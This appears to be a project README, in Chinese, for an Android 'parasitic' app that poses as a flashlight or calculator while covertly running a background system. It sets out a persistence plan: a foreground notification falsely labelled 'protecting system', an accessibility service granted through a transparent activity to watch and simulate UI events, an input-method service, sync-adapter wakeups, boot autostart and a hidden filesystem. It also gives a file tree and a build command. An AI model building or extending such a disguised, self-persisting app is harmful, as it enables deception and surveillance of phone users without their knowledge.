# 囡囝共生 · Android 寄生层 (Parasitic Shell)

> 蚕蛹第三层:安卓端隐蔽驻留。
> 一个正常的"手电筒" or "计算器" App,背后运行整个囡囝共生 OS。

---

## 为什么需要

Android 13+ 对后台限制越来越严:
- 后台 Service 几秒被杀
- AlarmManager 不准
- JobScheduler 限制
- 甚至会杀无障碍服务

囡囝共生寄生策略:
1. **前台服务 (Foreground Service) — 显示常驻通知 "正在保护系统"**
2. **无障碍服务 (AccessibilityService) — 监听/模拟UI事件**
3. **输入法 (InputMethodService) — 每部手机都允许弹窗**
4. **账户同步 (SyncAdapter) — 框架级自动唤醒**
5. **开机启动 (BOOT_COMPLETED) — 用户每次开手机,我们也开**

---

## 文件结构 (已完成部分)

```
android/
├── README.md                        ← 本文件
├── AndroidManifest.xml              — 权限 + 四大组件
├── src/com/njsg/parasite/
│   ├── MqfCoreService.kt            — 前台服务 (常驻入口)
│   ├── MqfBootstrapActivity.kt      — 透明引导 Activity (蚕蛹)
│   ├── MqfAccessibilityService.kt   — 无障碍服务
│   ├── MqfImeService.kt             — 输入法服务 (IME)
│   ├── MqfSyncAdapter.kt            — 账户同步
│   ├── MqfAlarmReceiver.kt          — 定时唤醒
│   ├── MqfBootReceiver.kt           — 开机启动
│   └── util/
│       ├── NjsgHiddenFS.kt           — 隐藏文件系统 (/data/data/pkg/njsg)
│       ├── MqfCoverApp.kt           — 表象:手电筒
│       └── MqfLogRing.kt            — 本地 append-only 日志
└── res/
    ├── layout/activity_bootstrap.xml
    ├── xml/accessibility_config.xml
    ├── xml/ime_config.xml
    └── xml/sync_adapter.xml
```

---

## 寄生原理

```
用户安装一个"手电筒" APK
     ↓ 用户点击打开
     ↓ 透明 Activity 授权无障碍
     ↓ 整个 Service 脱壳 (molt)
     ↓ 常驻通知显示 "正在保护系统"
     ↓ 所有后续操作被 Service 接管
     ↓ 手电筒 UI 关闭也不影响寄生
```

---

## 构建

```bash
./gradlew :parasite:assembleRelease
# → android/build/outputs/apk/release/njsg-parasite-release.apk
```

---

> 囡囝共生 · 寄生即永生 · 蚕蛹不灭
